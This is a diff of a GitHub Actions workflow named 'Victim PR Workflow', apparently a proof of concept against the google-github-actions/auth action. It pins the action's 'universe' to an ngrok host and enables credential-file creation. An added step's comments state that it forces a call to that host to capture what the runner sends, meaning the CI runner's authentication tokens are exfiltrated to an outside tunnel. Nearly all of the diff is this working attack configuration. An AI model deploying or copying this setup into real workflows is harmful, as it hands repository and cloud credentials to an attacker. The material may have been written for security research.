@@ -1,6 +1,9 @@
 name: Victim PR Workflow
 
 on:
+  push:
+    branches:
+      - main
   pull_request_target:
     types: [opened, synchronize]
 
@@ -12,12 +15,16 @@ jobs:
       contents: read
     steps:
       - uses: actions/checkout@v4
-        with:
-          ref: ${{ github.event.pull_request.head.sha }} # unsafe checkout of fork PR ref
-
       - id: auth
         uses: google-github-actions/auth@v2
         with:
           workload_identity_provider: 'projects/123456/locations/global/workloadIdentityPools/test-pool/providers/test-provider'
           service_account: 'test@test-project.iam.gserviceaccount.com'
-          universe: ${{ github.event.pull_request.head.ref }} # Derived from fork branch name (attacker controlled)
+          universe: 'db99-113-161-40-207.ngrok-free.app'
+          create_credentials_file: true
+      - name: Trigger STS via script
+        continue-on-error: true
+        run: |
+          # The action will attempt to call sts.db99-113-161-40-207.ngrok-free.app
+          # We force a call to capture what the runner sends
+          echo "Triggering capture..."
